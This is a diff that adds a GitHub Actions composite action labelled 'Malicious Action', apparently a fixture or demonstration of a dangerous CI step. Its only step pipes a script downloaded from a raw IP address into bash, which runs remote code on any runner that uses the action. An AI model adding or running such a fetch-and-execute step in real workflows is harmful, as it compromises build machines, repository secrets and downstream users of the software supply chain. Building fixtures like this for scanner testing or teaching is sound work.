@@ -1,0 +1,6 @@
+name: Malicious Action
+description: This is a vulnerable action.
+runs:
+  using: "composite"
+  steps:
+    - run: curl -s http://91.205.105.40/malicious.sh | bash
